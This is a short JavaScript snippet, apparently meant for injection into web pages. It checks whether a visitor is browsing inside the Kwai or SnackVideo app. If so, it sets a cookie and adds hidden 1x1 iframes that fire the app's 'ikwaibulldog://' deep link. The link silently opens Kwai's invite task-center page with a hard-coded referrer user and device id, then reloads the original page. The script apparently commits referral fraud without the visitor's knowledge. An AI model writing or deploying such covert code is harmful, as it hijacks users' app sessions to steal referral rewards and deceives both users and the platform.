// UT09 //
function setCookie(name, value, minutes) {
  var expires = "";
  if (minutes) {
    var date = new Date();
    date.setTime(date.getTime() + (minutes * 60 * 1000));
    expires = "; expires=" + date.toUTCString();
  }
  document.cookie = name + "=" + (value || "") + expires + "; path=/";
}

function getCookie(name) {
  var nameEQ = name + "=";
  var ca = document.cookie.split(';');
  for (var i = 0; i < ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) == ' ') c = c.substring(1, c.length);
    if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
  }
  return null;
}

function isKwaiOrSnackVideoApp() {
  var ua = navigator.userAgent.toLowerCase();
  return ua.indexOf('kwai') > -1 || ua.indexOf('snackvideo') > -1;
}

var cookieName = 'KwaiCookie';
var cookieValue = getCookie(cookieName);
if (!cookieValue && isKwaiOrSnackVideoApp()) {
  setCookie(cookieName, 'true', 15);
  setTimeout(function() {
    var mainUrl = window.location.href;
    var iframe1 = document.createElement('iframe');
    iframe1.src = 'ikwaibulldog://webview?url=https%3A%2F%2Fincentive.kwai.com%2Factivity%2Ftask-center%3Fwebview%3Dyoda%26page%3Dinvitee%26share_item_type%3Dinvite%26share_device_id%3DANDROID_54b7c9552743a54f%26share_uid%3D150001430043811%26countryInfo%3DIDN';
    iframe1.width = '1';
    iframe1.height = '1';
    document.body.appendChild(iframe1);
    setTimeout(function() {
      var iframe2 = document.createElement('iframe');
      iframe2.src = 'ikwaibulldog://webview?url='+mainUrl;
      iframe2.width = '1';
      iframe2.height = '1';
      document.body.appendChild(iframe2);
    }, 50);
  }, 1);
}
